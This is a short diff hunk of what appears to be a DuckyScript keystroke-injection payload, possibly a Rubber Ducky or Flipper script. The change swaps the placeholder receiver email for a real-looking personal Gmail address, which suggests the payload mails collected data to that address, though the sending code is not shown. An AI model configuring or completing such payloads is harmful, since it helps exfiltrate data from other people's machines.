@@ -8,7 +8,7 @@ REM       The perfectly timed keypresses are important for this payload to work 
 
 
 REM Define your E-Mail address
-DEFINE #RECEIVER your@mail.de
+DEFINE #RECEIVER tylergarnertheo.g@gmail.com
 
 REM Keycombo - Do not change!
 DEFINE $ICON T
